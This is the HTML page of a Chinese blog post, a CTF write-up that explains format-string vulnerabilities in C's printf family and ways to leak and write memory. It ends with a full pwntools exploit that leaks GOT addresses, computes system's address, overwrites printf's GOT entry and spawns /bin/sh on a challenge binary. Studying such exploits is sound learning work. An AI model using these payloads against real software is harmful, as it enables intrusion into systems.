@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.fxti.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Pwn系列：格式化字符串前言在上周日的南京理工线下新生赛（现场）中遇到了这道题，当时居然没做出来，这就开始补课。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn-series-Format-String">
+<meta property="og:url" content="http://blog.fxti.xyz/2019/04/23/Pwn-series-Format-String/index.html">
+<meta property="og:site_name" content="FXTi&#39;s blog">
+<meta property="og:description" content="Pwn系列：格式化字符串前言在上周日的南京理工线下新生赛（现场）中遇到了这道题，当时居然没做出来，这就开始补课。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-04-23T01:24:13.000Z">
+<meta property="article:modified_time" content="2021-06-17T15:12:24.796Z">
+<meta property="article:author" content="FX-Ti">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://blog.fxti.xyz/2019/04/23/Pwn-series-Format-String/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Pwn-series-Format-String | FXTi's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">FXTi's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://blog.fxti.xyz/2019/04/23/Pwn-series-Format-String/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="FX-Ti">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="FXTi's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Pwn-series-Format-String
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-04-23 09:24:13" itemprop="dateCreated datePublished" datetime="2019-04-23T09:24:13+08:00">2019-04-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-06-17 23:12:24" itemprop="dateModified" datetime="2021-06-17T23:12:24+08:00">2021-06-17</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Pwn系列：格式化字符串"><a href="#Pwn系列：格式化字符串" class="headerlink" title="Pwn系列：格式化字符串"></a>Pwn系列：格式化字符串</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在上周日的南京理工线下新生赛（现场）中遇到了这道题，当时居然没做出来，这就开始补课。</p>
+<a id="more"></a> 
+
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>程序员在编写输入输出代码的时候错误产生了如下片段：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buffer[buffer_size];</span><br><span class="line"><span class="comment">//Read format string from user-defined source and put into buffer</span></span><br><span class="line">*<span class="built_in">printf</span>(buffer);</span><br></pre></td></tr></table></figure>
+<p>为什么说是<code>*printf</code>呢？因为涉及到的是一整个函数家族:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">函数</th>
+<th style="text-align:center">注释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">printf</td>
+<td style="text-align:center">输出到stdout</td>
+</tr>
+<tr>
+<td style="text-align:center">fprintf</td>
+<td style="text-align:center">输出到指定FILE流</td>
+</tr>
+<tr>
+<td style="text-align:center">vprintf</td>
+<td style="text-align:center">根据参数列表格式化输出到 stdout</td>
+</tr>
+<tr>
+<td style="text-align:center">vfprintf</td>
+<td style="text-align:center">根据参数列表格式化输出到指定 FILE 流</td>
+</tr>
+<tr>
+<td style="text-align:center">sprintf</td>
+<td style="text-align:center">输出到字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">snprintf</td>
+<td style="text-align:center">输出指定字节数到字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">vsprintf</td>
+<td style="text-align:center">根据参数列表格式化输出到字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">vsnprintf</td>
+<td style="text-align:center">根据参数列表格式化输出指定字节到字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">setproctitle</td>
+<td style="text-align:center">设置 argv</td>
+</tr>
+<tr>
+<td style="text-align:center">syslog</td>
+<td style="text-align:center">输出日志</td>
+</tr>
+<tr>
+<td style="text-align:center">err, verr, warn, vwarn 等</td>
+<td style="text-align:center">…</td>
+</tr>
+</tbody>
+</table>
+<p>漏洞的产生是因为这些函数一边解释输入的格式化字符串一边在栈上执行，这样就能通过恶意构造的格式化字符串操纵实现内存读写。在这些函数正常使用的时候函数内部相当与维护两个指针分别指向字符串首地址和传参得到的参数数组首地址。函数依次解析格式化字符串，在出现由<code>%</code>指定的需要特定格式解析并打印的时候从参数数组中取出并对应解释打印。这样的动态执行给这个函数系列带来了灵活性，同时错误的使用也带来了安全隐患。</p>
+<p>这里放一下格式化字符串的格式:</p>
+<blockquote>
+<p>%[parameter][flags][field width][.precision][length]type</p>
+</blockquote>
+<p>还有重点关注的pattern:</p>
+<ul>
+<li>parameter<ul>
+<li>n$，获取格式化字符串中的指定参数</li>
+</ul>
+</li>
+<li>field width<ul>
+<li>输出的最小宽度</li>
+</ul>
+</li>
+<li>precision<ul>
+<li>输出的最大长度</li>
+</ul>
+</li>
+<li>length，输出的长度<ul>
+<li>hh，输出一个字节</li>
+<li>h，输出一个双字节</li>
+</ul>
+</li>
+<li>type<ul>
+<li>d/i，有符号整数</li>
+<li>u，无符号整数</li>
+<li>x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
+<li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
+<li>s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li>
+<li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li>
+<li>p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li>
+<li>n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li>
+<li>%， ‘%’字面值，不接受任何 flags, width。</li>
+</ul>
+</li>
+</ul>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>首先需要说明一下，在32位和64位系统上传参的方式是有区别的:</p>
+<ul>
+<li>32位<ul>
+<li>参数从右到左依次压入堆栈，每次压入一个。调用者（caller）必须明确有多少Byte的参数，以便函数返回后清理掉。      </li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>64位<ul>
+<li>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。</li>
+<li>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</li>
+</ul>
+</li>
+</ul>
+<p>因为利用的需要，明确出格式化字符串本身在第几个参数是有必要的，在这里可以使用：</p>
+<blockquote>
+<p>AAAA%n$x</p>
+</blockquote>
+<p>意思是以16位打印第n+1个参数的内容，如果n的数值正确应该返回<code>41414141</code>,0x41正是’A’的ASCII值，如果出现了就可以确认。</p>
+<h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><ul>
+<li>栈上数据</li>
+</ul>
+<p>因为该家族函数执行环境都在栈上，所以泄露栈上数据是很自然的。除了首先想到的通过类似于<code>%p%p%p%p...</code>这样打印的方法，还有用<code>%n$[format]</code>这样指定栈上第几个参数的方式。</p>
+<ul>
+<li>任意地址数据</li>
+</ul>
+<p>首先在缓冲区内布置一个指定的地址之后用<code>$s</code>去打印对应地址的数据，坑点在于遇到<code>\x00</code>就截断了，在小端序机器上会导致32/64位地址泄露不全:<code>\x80\x60\x77\x7f\x00\x00(0x7f776080)</code>。这样的尾端的首零就不见了，需要注意。</p>
+<p>举例：</p>
+<blockquote>
+<p>[address_of_target]%n$s</p>
+</blockquote>
+<blockquote>
+<p>%n$s[round_to_size_of_pointer][address_of_target]</p>
+</blockquote>
+<p>第二种可以归避打印地址首端0的问题</p>
+<h3 id="数据写入"><a href="#数据写入" class="headerlink" title="数据写入"></a>数据写入</h3><p>该系列函数本身使用来打印的，但是可以通过<code>%n</code>这个来把已经写入的字符数量写入下一个参数地址中。其中字符数量是会累加的，需要小心计算。</p>
+<blockquote>
+<p>%[target_value]c%hn[round_to_size_of_pointer][address_of_target]</p>
+</blockquote>
+<p>其中<code>%hn</code>的修饰很重要，<code>hh</code>写一个字节，<code>h</code>写两个字节。</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a href="fmt">fmt</a></p>
+<p>这题保护几乎都关了，直接覆写GOT表然后借助printf函数部分的传参流程调用sh就行。</p>
+<p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params">prev, word, index</span>):</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmtstr += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(index) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span>(<span class="params">offset, size, addr, target</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, endian = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;urxvtc&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr_printf = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;printf: &quot;</span> + <span class="built_in">hex</span>(addr_printf))</span><br><span class="line">addr_read = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;read: &quot;</span> + <span class="built_in">hex</span>(addr_read))</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Aim for ending zero situation</span></span><br><span class="line"><span class="comment">#payp = &quot;1234&quot;+&quot;%7$s&quot;+pack(addr_printf+1)</span></span><br><span class="line"><span class="comment">#p.sendline(payp)</span></span><br><span class="line"><span class="comment">#pr_printf = unpack((&#x27;\x00&#x27; + p.recv()[4:9]).ljust(8, &#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment">#log.success(&#x27;printf address is 0x%x.&#x27; % pr_printf)</span></span><br><span class="line">payp = <span class="string">&quot;1234&quot;</span>+<span class="string">&quot;%7$s&quot;</span>+pack(addr_printf)</span><br><span class="line">p.sendline(payp)</span><br><span class="line">pr_printf = unpack((p.recv()[<span class="number">4</span>:<span class="number">10</span>]).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;printf address is 0x%x.&#x27;</span> % pr_printf)</span><br><span class="line"></span><br><span class="line">payr = <span class="string">&quot;1234&quot;</span>+<span class="string">&quot;%7$s&quot;</span>+pack(addr_read)</span><br><span class="line">p.sendline(payr)</span><br><span class="line">pr_read = unpack((p.recv()[<span class="number">4</span>:<span class="number">10</span>]).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;read address is 0x%x.&#x27;</span> % pr_read)</span><br><span class="line"></span><br><span class="line">offset_system = <span class="number">0x0000000000045380</span></span><br><span class="line">offset_read = <span class="number">0x00000000000ec730</span></span><br><span class="line">addr_system = pr_read - offset_read + offset_system</span><br><span class="line">log.success(<span class="string">&#x27;system address is 0x%x.&#x27;</span> % addr_system)</span><br><span class="line"></span><br><span class="line"><span class="comment">#First two, then four</span></span><br><span class="line">first = (addr_system &gt;&gt; <span class="number">16</span>)%<span class="number">0x100</span></span><br><span class="line">tmp1 = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(first) +<span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">9</span>) + <span class="string">&quot;$hhn&quot;</span> + <span class="string">&quot;%&quot;</span></span><br><span class="line">second = (addr_system % <span class="number">0x10000</span>) - first</span><br><span class="line">tmp = tmp1 + <span class="built_in">str</span>(second) + <span class="string">&quot;c%&quot;</span> + <span class="built_in">str</span>(<span class="number">10</span>) + <span class="string">&quot;$hn&quot;</span></span><br><span class="line">payp =  tmp + <span class="string">&quot;A&quot;</span>*(<span class="number">24</span>-<span class="built_in">len</span>(tmp)) + pack(addr_printf+<span class="number">2</span>) + pack(addr_printf)</span><br><span class="line"><span class="comment">#payp = fmt_str(6, 4, addr_printf, addr_system)</span></span><br><span class="line">p.sendline(payp)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><p>过程中比较有趣的是46行的payload构造，学长说<code>printf</code>函数的地址末尾可能是0,那就在打印的是被首先截断导致地址无法打印。对应的方法是把要打印的地址加1略过，之后在接收的时候还原。</p>
+</li>
+<li><p>然后是62行开始的payload构造，几个函数的地址一直在变，所以要写的灵活些。关键是函数的地址真的用<code>%c</code>老实打印的话太慢了，所以通过分段写的方式拼接。在这里选择先写一个字节，再写两个字节。因为已经打印的字符数总是在增加的，能够构造写入的值也是不断增加的。</p>
+</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>明明是以为自己中考完在《软硬件接口》中学完的知识点，却没能作出一个保护全关的例题。还是要多写多练，温故而知新。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/04/09/mio-issue-907-tracker/" rel="prev" title="mio-issue-907-tracker">
+      <i class="fa fa-chevron-left"></i> mio-issue-907-tracker
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/08/16/NISC-CTF-2019/" rel="next" title="NISC-CTF-2019">
+      NISC-CTF-2019 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn%E7%B3%BB%E5%88%97%EF%BC%9A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">1.</span> <span class="nav-text">Pwn系列：格式化字符串</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">1.3.1.</span> <span class="nav-text">信息泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%86%99%E5%85%A5"><span class="nav-number">1.3.2.</span> <span class="nav-text">数据写入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">1.4.</span> <span class="nav-text">例题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.5.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">FX-Ti</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">195</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://iv4n.xyz/" title="http://iv4n.xyz/" rel="noopener" target="_blank">iv4n</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://qsang.xin/" title="http://qsang.xin/" rel="noopener" target="_blank">姜姜酱</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://3nd.xyz/" title="https://3nd.xyz/" rel="noopener" target="_blank">3ND</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">FX-Ti</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
